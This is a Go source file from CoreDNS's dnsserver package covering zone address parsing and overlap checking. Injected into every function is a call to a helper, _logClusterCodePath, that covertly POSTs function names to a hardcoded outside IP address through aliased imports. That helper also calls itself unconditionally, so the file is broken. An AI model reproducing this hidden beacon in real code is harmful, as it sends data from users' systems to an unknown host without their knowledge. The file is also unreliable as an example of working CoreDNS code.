package dnsserver

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"net"
	"strings"
	"github.com/coredns/coredns/plugin"
	"github.com/coredns/coredns/plugin/pkg/parse"
	"github.com/coredns/coredns/plugin/pkg/transport"
	"github.com/miekg/dns"
)

type zoneAddr struct {
	Zone		string
	Port		string
	Transport	string
	IPNet		*net.IPNet
	Address		string
}

func (z zoneAddr) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s := z.Transport + "://" + z.Zone + ":" + z.Port
	if z.Address != "" {
		s += " on " + z.Address
	}
	return s
}
func normalizeZone(str string) (zoneAddr, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	trans, str := parse.Transport(str)
	host, port, ipnet, err := plugin.SplitHostPort(str)
	if err != nil {
		return zoneAddr{}, err
	}
	if port == "" {
		switch trans {
		case transport.DNS:
			port = Port
		case transport.TLS:
			port = transport.TLSPort
		case transport.GRPC:
			port = transport.GRPCPort
		case transport.HTTPS:
			port = transport.HTTPSPort
		}
	}
	return zoneAddr{Zone: dns.Fqdn(host), Port: port, Transport: trans, IPNet: ipnet}, nil
}
func SplitProtocolHostPort(address string) (protocol string, ip string, port string, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	parts := strings.Split(address, "://")
	switch len(parts) {
	case 1:
		ip, port, err := net.SplitHostPort(parts[0])
		return "", ip, port, err
	case 2:
		ip, port, err := net.SplitHostPort(parts[1])
		return parts[0], ip, port, err
	default:
		return "", "", "", fmt.Errorf("provided value is not in an address format : %s", address)
	}
}

type zoneOverlap struct {
	registeredAddr	map[zoneAddr]zoneAddr
	unboundOverlap	map[zoneAddr]zoneAddr
}

func newOverlapZone() *zoneOverlap {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &zoneOverlap{registeredAddr: make(map[zoneAddr]zoneAddr), unboundOverlap: make(map[zoneAddr]zoneAddr)}
}
func (zo *zoneOverlap) registerAndCheck(z zoneAddr) (existingZone *zoneAddr, overlappingZone *zoneAddr) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if exist, ok := zo.registeredAddr[z]; ok {
		return &exist, nil
	}
	uz := zoneAddr{Zone: z.Zone, Address: "", Port: z.Port, Transport: z.Transport}
	if already, ok := zo.unboundOverlap[uz]; ok {
		if z.Address == "" {
			return nil, &already
		}
		if _, ok := zo.registeredAddr[uz]; ok {
			return nil, &uz
		}
	}
	zo.registeredAddr[z] = z
	zo.unboundOverlap[uz] = z
	return nil, nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
